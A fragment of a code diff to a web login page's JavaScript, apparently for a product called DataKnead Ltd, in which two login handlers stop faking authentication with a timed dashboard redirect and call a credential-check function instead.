+            return false;
+        }
+
         function handleLandingLogin(e) {
-            e.preventDefault();
-            switchView('login');
+            checkCreds(e);
         }
 
         function handleDedicatedLogin(e) {
-            e.preventDefault();
-            const btn = document.getElementById('btn-ded-login-submit');
-            if (btn) {
-                btn.innerText = 'Authenticating DataKnead Ltd...';
-                btn.style.opacity = '0.8';
-                setTimeout(() => {
-                    btn.innerText = 'Sign in';
-                    btn.style.opacity = '1';
-                    switchView('dashboard');
-                }, 650);
-            }
+            checkCreds(e);
         }
 
         function togglePasswordVisibility() {
